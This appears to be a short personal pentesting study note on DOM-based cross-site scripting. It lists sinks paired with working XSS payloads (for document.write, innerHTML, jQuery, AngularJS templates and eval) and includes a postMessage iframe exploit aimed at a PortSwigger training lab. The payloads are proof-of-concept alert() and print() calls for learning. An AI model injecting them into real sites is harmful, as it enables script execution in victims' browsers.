[[Pentest/Vulns/XSS/XSS|XSS]]
#xss
It's like [[Reflected XSS]], but the payload doesnt go though server.

TODO: more details and examples

**Automated search**: DOM Invader in burp browser extension.

##### How to find
1. Search for entry points like `location.search`. Inject a random payload into it.
2. Grep the response HTML for used payload.
3. Adjust payload to execute it

**sink / payload**:
* `document.write` / `<svg onload=alert(1) />`
* `innerHTMl=` /  `<img src=x onerror=alert(1) />` 
	* or iframe tag bc script tag, svg onload wont work
* [[jquery]] `attr()` / `?returnUrl=javascript:alert(document.domain)`
* jquery `$(location.hash)` / `<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">` 
* `ng-app` / `{{$on.constructor('alert(1)')()}}`
* ```eval('var result = {"results":[],"searchTerm":+payload+"}';')```   /  `\"-alert(1)}//`


**List of sinks**: https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities


##### iframe messages example
```js
window.addEventListener('message', function(e) {
	document.getElementById('ads').innerHTML = e.data;
})
```

```html
<iframe style="width: 1000px;height: 500px;" src="https://0a3f00cc04e03997843386a000f0009b.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print() />','*')" />
```




















